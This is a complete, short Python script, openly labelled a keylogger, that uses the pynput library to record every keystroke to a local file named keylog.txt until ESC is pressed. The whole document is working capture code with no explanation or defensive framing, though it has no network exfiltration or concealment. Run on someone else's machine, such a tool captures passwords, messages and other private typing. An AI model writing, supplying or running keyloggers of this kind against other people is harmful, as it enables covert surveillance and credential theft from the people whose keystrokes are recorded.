from pynput import keyboard


LOG_FILE = "keylog.txt"

def on_press(key):
    """Callback function when a key is pressed."""
    try:
        
        with open(LOG_FILE, "a") as f:
            if hasattr(key, 'char') and key.char:
                f.write(key.char)
            else:
                
                f.write(f" [{key}] ")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    """Callback function when a key is released."""
    if key == keyboard.Key.esc:
    
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger is running... Press ESC to stop.")
    listener.join()
